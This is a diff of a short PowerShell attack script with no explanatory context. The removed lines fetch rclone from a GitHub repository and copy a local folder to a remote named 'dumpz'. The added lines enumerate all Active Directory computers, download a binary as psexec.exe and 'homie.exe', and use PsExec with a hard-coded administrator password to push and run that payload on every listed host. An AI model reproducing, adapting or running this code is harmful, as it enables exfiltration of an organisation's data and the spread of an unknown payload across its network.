@@ -1,6 +1,6 @@
 $ErrorActionPreference="SilentlyContinue"
 cd $env:temp
-curl https://github.com/d77juan/t3st1n6/raw/main/rclone.zip -o rclone.zip
-Expand-Archive .\rclone.zip .
-sleep 5
-Start-Process -FilePath '.\rclone.exe' -ArgumentList  'copy c:\run remote:dumpz'
+(Get-AdComputer -Filter *).Name | Out-File $env:temp\computers.txt; type $env:temp\computers.txt
+curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\psexec.exe
+curl https://github.com/d77juan/t3st1n6/raw/main/psexec33 -o $env:temp\homie.exe
+Start-Process -FilePath '.\psexec.exe' -ArgumentList  '@$env:temp\computers.txt -u administrator -p Zxcv7890! -c homie.exe'
